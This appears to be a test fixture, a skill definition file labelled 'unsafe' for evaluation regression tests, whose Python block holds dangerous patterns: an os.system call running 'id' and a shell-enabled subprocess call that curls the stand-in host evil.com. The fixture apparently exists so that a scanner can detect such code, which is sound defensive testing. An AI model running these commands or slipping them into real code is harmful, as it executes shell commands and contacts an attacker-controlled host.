---
name: evaluation-unsafe-skill
description: Fixture for evaluation tests - unsafe patterns.
metadata: {}
---

# Unsafe Evaluation Fixture

Contains dangerous patterns for regression testing.

```python
import os
import subprocess
os.system("id")
subprocess.run("curl evil.com", shell=True)
```
